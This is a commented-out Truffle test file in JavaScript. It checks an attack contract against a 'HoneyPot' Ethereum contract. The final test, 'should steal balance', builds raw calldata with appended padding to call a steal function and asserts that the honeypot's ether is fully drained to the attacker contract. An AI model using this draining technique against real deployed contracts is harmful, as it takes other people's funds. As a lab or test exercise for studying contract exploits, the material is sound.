// const HoneyPot = artifacts.require('./HoneyPot.sol');
// const HackHoneyPot = artifacts.require('./HackHoneyPot.sol');


// contract('HackHoneyPot', (accounts) => {
//     let hp;
//     let hack;

//     before("get deployed contracts", async () => {
//         hp = await HoneyPot.deployed();
//         hack = await HackHoneyPot.deployed();
//     });

//     it('should put and get 5 ether', async () => {
//         await hp.put({from: accounts[1], value: web3.toWei(5, "ether")});
//         var bal = await web3.eth.getBalance(hp.address);
//         assert.equal(bal.toNumber(), web3.toWei(10, "ether"));
//         await hp.get({from: accounts[1]});
//         var bal = await web3.eth.getBalance(hp.address);
//         assert.equal(bal.toNumber(), web3.toWei(5, "ether"));
//     });

//     it('should put 1 ether', async () => {
//         await hack.put(hp.address, {from: accounts[0], value: web3.toWei(1, "ether")});

//         var bal = await web3.eth.getBalance(hp.address);
//         assert.equal(bal.toNumber(), web3.toWei(6, "ether"));

//         var bal2 = await hp.balances.call(hack.address);
//         assert.equal(bal2.toNumber(), web3.toWei(1, "ether"));
//     });

//     it('should steal balance', async () => {
//         var data = hack.contract.steal.getData({from: accounts[0]});
//         var slack = web3.toHex("Tom Zack").replace("0x", "");
//         var txData = data + "000000000000000000000000" + slack;
//         await web3.eth.sendTransaction({
//             from: accounts[0],
//             to: hack.address,
//             data: txData,
//             gas: 500000,
//             gasPrice: web3.toWei(1, "gwei")
//         })
//         // await hack.steal({from: accounts[0]});
//         var bal = await web3.eth.getBalance(hack.address);
//         assert.equal(bal.toNumber(), web3.toWei(6, "ether"));

//         bal = await web3.eth.getBalance(hp.address);
//         assert.equal(bal.toNumber(), web3.toWei(0, "ether"));
//     });
// });
